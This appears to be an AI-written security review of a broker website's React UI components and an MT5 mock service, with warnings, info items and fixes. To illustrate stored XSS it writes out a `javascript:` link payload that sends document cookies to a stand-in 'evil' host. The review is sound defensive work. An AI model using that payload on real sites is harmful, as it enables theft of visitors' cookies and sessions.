---
status: issues_found
area: 'Shared UI & MT5 Service'
reviewed: 2026-06-18
depth: deep
files_reviewed:
  - packages/ui/src/components/RichText.tsx
  - packages/ui/src/components/TradingViewWidget.tsx
  - packages/ui/src/components/TradingViewTicker.tsx
  - packages/ui/src/components/AuthModal.tsx
  - packages/ui/src/components/ContactPage.tsx
  - packages/ui/src/components/NewsletterPage.tsx
  - packages/ui/src/components/EbooksPage.tsx
  - packages/ui/src/components/WebinarsPage.tsx
  - packages/ui/src/components/Footer.tsx
  - packages/ui/src/components/LanguageToggle.tsx
  - packages/ui/src/components/LiveWatchlistPage.tsx
  - packages/ui/src/components/AnalystChartPage.tsx
  - packages/ui/src/components/EconomicCalendarPage.tsx
  - packages/ui/src/components/AwardsPage.tsx
  - packages/ui/src/components/MediaPressPage.tsx
  - packages/ui/src/components/PlatformPage.tsx
  - packages/ui/src/components/ResearchPage.tsx
  - packages/ui/src/components/TrustStrip.tsx
  - packages/ui/src/index.ts
  - packages/types/src/locales.ts
  - packages/types/src/mt5.ts
  - packages/types/src/index.ts
  - apps/mt5-service/src/index.ts
  - apps/mt5-service/src/manager.ts
findings:
  critical: 0
  warning: 4
  info: 4
  total: 8
---

# Area 4 — Shared UI (packages/ui) & MT5 Service

## Summary

The shared UI layer and MT5 mock bridge are in noticeably better shape than a
typical first pass would suggest. The high-value attack surfaces I was sent to
hunt came up **clean**:

- **No `dangerouslySetInnerHTML` rendering untrusted input** anywhere in
  `packages/ui`. The only occurrence in the whole web app is a static JSON-LD
  `FinancialService` schema in `apps/web/src/app/[locale]/layout.tsx:140` built
  from a hardcoded object literal — not attacker-controllable, not in scope.
- **No hardcoded secrets/API keys** ship to the browser. Every `process.env`
  reference in client components is a `NEXT_PUBLIC_*` var (CMS URL, chart
  provider flag, web-terminal URL) — all intentionally public.
- **Every `target="_blank"` already carries `rel="noopener noreferrer"`.** I
  verified all 11 occurrences individually (AwardsPage, EconomicCalendarPage,
  Footer, LiveWatchlistPage, MediaPressPage ×3, PlatformPage, ResearchPage,
  TrustStrip, WebinarsPage). A naive single-line grep flags these as missing
  `rel` because the attribute sits on the following line — they are **not** a
  finding.
- **TradingView widgets** (`TradingViewWidget.tsx`, `TradingViewTicker.tsx`) use
  the documented external-embedding pattern: `script.src` is pinned to a static
  `s3.tradingview.com` allowlist keyed by a typed union, and the widget config
  is `JSON.stringify`-serialized as inert data inside the embed script. The
  script body never executes caller strings as code. Callsites pass static
  props. Low risk — recorded as INFO only.
- **mt5-service** is solid for a mock: `timingSafeEqual` token comparison,
  internal Bearer-token middleware on `/instruments`, strict symbol validation
  (`/^[A-Z0-9._-]{1,20}$/`), `assetClass` allowlist validation, a real error
  handler that returns generic 500s (no stack leakage), and graceful SIGTERM/
  SIGINT shutdown.

The genuine defects are a consistent **missing URL-scheme allowlist** on
CMS-supplied `href`/`src` values (RichText + ~7 page components), **permissive
CORS** on the deployed mt5-service, and a **`localhost` production fallback** in
all four public forms. None rise to CRITICAL under the actual trust model (CMS
content is authored by semi-trusted admins; no path lets an anonymous end-user
inject rich text or link URLs), but they are real and should be fixed.

---

## Warnings

### [WARNING] RichText renders link `href` and image `src` with no URL-scheme allowlist (stored `javascript:`/`data:` vector)

**File:** `packages/ui/src/components/RichText.tsx:122-132` (link), `:144-151` (upload image)

**What's wrong:** The Slate `link` node renders `<a href={node.url ?? '#'}>`
with zero validation of the URL scheme, and the `upload` node renders
`<img src={media.url}>` likewise. `node.url` / `media.url` originate from
Payload rich-text fields. React does **not** sanitize `href`/`src` — it only
emits a dev-only console warning for `javascript:` URLs and still renders the
attribute in production. A rich-text author (or anyone who can influence
rich-text content) who sets a link URL to `javascript:fetch('//evil/'+document.cookie)`
produces a clickable stored-XSS payload. `data:text/html,...` is similarly
unguarded.

**Impact:** Stored XSS / script execution in the context of newera365.com if any
rich-text source is less than fully trusted. On a regulated broker site, a
single compromised or careless CMS editor account becomes script execution
against every visitor of the affected article/guide/report. Bounded today by
the fact that rich text is admin-authored, which is why this is WARNING rather
than CRITICAL — but it is the single most dangerous gap in this area.

**Fix:** Add a scheme allowlist helper and apply it to every CMS-derived
`href`/`src`:

```ts
const SAFE_URL = /^(https?:|mailto:|tel:|\/|#)/i;
function safeUrl(u: string | undefined): string {
  if (!u) return '#';
  const trimmed = u.trim();
  return SAFE_URL.test(trimmed) ? trimmed : '#';
}
// link:  href={safeUrl(node.url)}
// upload: const src = safeUrl(media.url); if (src === '#') return null;
```

---

### [WARNING] CMS-supplied `href`/`src` rendered without scheme validation across 7 page components

**File:** `packages/ui/src/components/AwardsPage.tsx:194` (`href={award.externalUrl}`), `MediaPressPage.tsx:124,151,256` (`href={item.url}`), `PlatformPage.tsx:284` (`href={downloads?.webTrader}`), `ResearchPage.tsx:522` (`href={report.reportUrl}`), `TrustStrip.tsx:45` (`href={logo.href}`), `WebinarsPage.tsx:240` (`href={w.replayUrl}`), `Footer.tsx:246` (`href={s.href!}` social links)

**What's wrong:** Same class as the RichText finding — these all interpolate a
CMS/SiteSettings-managed URL straight into an anchor `href` (and PlatformPage
into a download link) with no `javascript:`/`data:` filtering. The `target="_blank"`
links are partially mitigated (a `javascript:` URL opened in a new browsing
context generally won't execute against the parent), but `Footer` social links,
`TrustStrip`, and any same-tab variant are not, and relying on `_blank` for XSS
defense is fragile.

**Impact:** A CMS author can plant a `javascript:`-scheme link in awards, press
items, research reports, partner/trust logos, webinar replays, or the global
footer social links. Semi-trusted-author trust model keeps this at WARNING, but
it is a real injection surface and should share the same `safeUrl()` helper as
RichText.

**Fix:** Extract the `safeUrl()` allowlist helper (above) into a shared util
(e.g. `packages/ui/src/lib/url.ts`) and wrap every CMS-derived `href`/`src` with
it. Centralizing it also prevents the next new page from re-introducing the gap.

---

### [WARNING] mt5-service uses fully permissive CORS (`cors()` with no origin allowlist)

**File:** `apps/mt5-service/src/index.ts:33`

**What's wrong:** `app.use(cors());` enables `Access-Control-Allow-Origin: *`
for every route on the deployed service. Although `/instruments` is protected by
an internal Bearer token (good), the service is documented as deployable and CORS
is wide open, so any website can issue cross-origin requests to it. Combined with
the `requireInternalToken` middleware being **skipped entirely when
`MT5_INTERNAL_API_TOKEN` is unset** (`:39-42`), a misconfigured deployment would
expose an unauthenticated, any-origin instrument feed.

**Impact:** Information exposure / abuse of a deployed internal service from
arbitrary browser origins; resource consumption from untrusted callers. The
token-optional design means a single missing env var degrades to fully open.

**Fix:** Restrict CORS to known origins and treat a missing internal token as a
hard failure in production:

```ts
app.use(cors({ origin: process.env.MT5_ALLOWED_ORIGINS?.split(',') ?? false }));
// and in startup:
if (process.env.NODE_ENV === 'production' && !MT5_INTERNAL_API_TOKEN) {
  throw new Error('MT5_INTERNAL_API_TOKEN must be set in production');
}
```

---

### [WARNING] All four public forms fall back to `http://localhost:3001` when `NEXT_PUBLIC_CMS_URL` is unset — silent prod failure

**File:** `packages/ui/src/components/ContactPage.tsx:99`, `NewsletterPage.tsx:25`, `EbooksPage.tsx:52`, `WebinarsPage.tsx:24-27`

**What's wrong:** Every form's submit URL is
`` `${process.env.NEXT_PUBLIC_CMS_URL ?? 'http://localhost:3001'}/api/...` ``. If
the env var is not injected at build time on Vercel (a common deploy slip for
`NEXT_PUBLIC_*` vars, which are inlined at build, not runtime), the production
bundle ships hardcoded `http://localhost:3001`. Visitors' browsers then POST to
their own machine — contact messages, newsletter signups, ebook gates, and
webinar registrations all silently fail (or hit a mixed-content/refused
connection), with the generic "Something went wrong" message giving no signal to
operators.

**Impact:** Lead-capture data loss with no error surfaced server-side. For a
broker whose funnel depends on these forms, this is a silent revenue/compliance
leak that only manifests in production.

**Fix:** Fail loudly instead of defaulting to localhost in production builds —
e.g. centralize the base URL and throw/log at module load if
`NEXT_PUBLIC_CMS_URL` is missing and `NODE_ENV === 'production'`, or at minimum
guard CI/build to assert the var is set. Do not bake `localhost` into shipped
client code.

---

## Info

### [INFO] TradingView embed config is built from props without an explicit symbol allowlist

**File:** `packages/ui/src/components/TradingViewWidget.tsx:51-86,119-125`

**What's wrong:** `buildConfig` spreads caller-supplied `symbol` and `config`
into the JSON written to `script.innerHTML`. This is the standard, safe
TradingView pattern (the body is serialized data, the `src` is a fixed CDN), and
all current callsites pass static literals — so there is no exploit. Noted only
because if a future callsite ever pipes a CMS/user-controlled `symbol` straight
in, the value would reach a third-party widget unfiltered.

**Fix:** If dynamic symbols are ever introduced, validate against a known
instrument list before passing to the widget. No action needed for current
static usage.

### [INFO] `NEXT_LOCALE` cookie set without `Secure` flag

**File:** `packages/ui/src/components/LanguageToggle.tsx:31`

**What's wrong:** The locale cookie is written `SameSite=lax; max-age=...` but
without `Secure`, so it is sent over plain HTTP. The value is a non-sensitive
locale preference (`en`/`ar`), so there is no confidentiality impact; the locale
segment swap (`:34`) is correctly anchored to the leading `^/[a-z]{2}` segment
and navigates only to same-origin relative paths (no open-redirect).

**Fix:** Add `Secure` to the cookie string for hygiene/consistency with other
cookies once the site is HTTPS-only.

### [INFO] RichText heading IDs can collide, producing duplicate DOM `id`s

**File:** `packages/ui/src/components/RichText.tsx:52,64,183-187`

**What's wrong:** `h2`/`h3` anchor IDs (and `extractHeadings`) are derived purely
by slugifying heading text. Two headings with identical text in one document
yield identical `id` attributes — invalid HTML, and table-of-contents anchor
links jump only to the first match. Functional/quality issue, not security.

**Fix:** Deduplicate by appending an incrementing suffix when an ID has already
been emitted within the document.

### [INFO] AuthModal lacks focus trapping / initial focus for an `aria-modal` dialog

**File:** `packages/ui/src/components/AuthModal.tsx:51-57`

**What's wrong:** The modal sets `role="dialog" aria-modal="true"` and handles
Escape + body-scroll lock (good), but does not trap Tab focus inside the dialog
or move focus to the first field on open, so keyboard/AT users can tab into the
inert page behind the backdrop. (Form submit is intentionally a no-op —
`onSubmit={(e) => e.preventDefault()}` — because real auth is owned by the
client CRM team, so the missing network/validation here is by design, not a bug.)

**Fix:** Add focus-trap + initial-focus handling (or adopt a headless dialog
primitive) for accessibility. No security impact.

---

_Reviewed: 2026-06-18_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
